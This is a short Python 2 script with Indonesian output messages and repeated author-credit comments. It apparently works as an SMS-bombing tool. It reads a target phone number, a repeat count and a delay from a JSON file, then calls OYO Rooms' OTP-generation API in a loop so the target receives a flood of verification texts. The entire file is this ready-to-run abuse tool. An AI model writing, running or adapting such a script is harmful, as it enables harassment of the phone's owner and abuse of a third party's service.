# -*- coding: utf-8 -*-
import json, os, requests, sys, time
# Ahmad Khoirul Marzuqin
from warna import *
# Ahmad Khoirul Marzuqin
reload (sys)
# Ahmad Khoirul Marzuqin
sys.setdefaultencoding ("utf8")
# Ahmad Khoirul Marzuqin
print u + 53 * "═"
# Ahmad Khoirul Marzuqin
def irul():
	with open ("nomor.json") as baca:
		jl = json.load(baca)
		nomor = jl["nomor"]
		jumlah = int(jl["jumlah"])
		jeda = jl["jeda"]
		try:
			for j in range (1, jumlah + 1):
				rg = requests.get ("https://www.oyorooms.com/api/pwa/generateotp?phone="+ nomor +"&country_code=+62")
				if str("correct") in str(rg.text):
					print k +"Sms"+ n +" OYOHOTELS "+ n +"•"+ h +" Mengirim Pesan Sms : "+ b + str(j) + h +" ✓   \r"
				else:
					print k +"Sms"+ n +" OYOHOTELS "+ n +"•"+ m +" limited "+ n +"or"+ m +" connection lost\r"
				os.system ("sleep "+ jeda)
		except (KeyError, IOError):
			titik = ["     ", ".    ", "..   ", "...  ", ".... ", "....."]
			for t in titik:
				print m +"\r!!! Aktifkan Koneksi Internet "+ n + t,
				sys.stdout.flush()
				time.sleep (1)
			irul()
# Ahmad Khoirul Marzuqin
irul()
# Ahmad Khoirul Marzuqin